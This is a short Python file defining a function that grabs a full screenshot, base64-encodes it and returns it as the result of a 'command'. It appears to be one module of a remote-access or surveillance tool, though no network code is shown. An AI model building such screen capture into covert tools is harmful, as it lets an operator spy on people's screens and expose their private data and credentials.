import io
from PIL import ImageGrab
from termcolor import colored
import base64

def excute_screenshot():
    try:
        # Capture a screenshot using the Pillow library
        screenshot = ImageGrab.grab()

        # Convert the screenshot image to a binary data stream in memory
        screenshot_bytes = io.BytesIO()
        screenshot.save(screenshot_bytes, format='PNG')
        screenshot_data = screenshot_bytes.getvalue()
        # Transmit the command excution in base64 encoding
        excution_result = base64.b64encode(screenshot_data)
        return excution_result.decode('utf-8')
    except Exception as e:
                return colored(f"Error running command screenshot: {str(e)}" , "red")
        
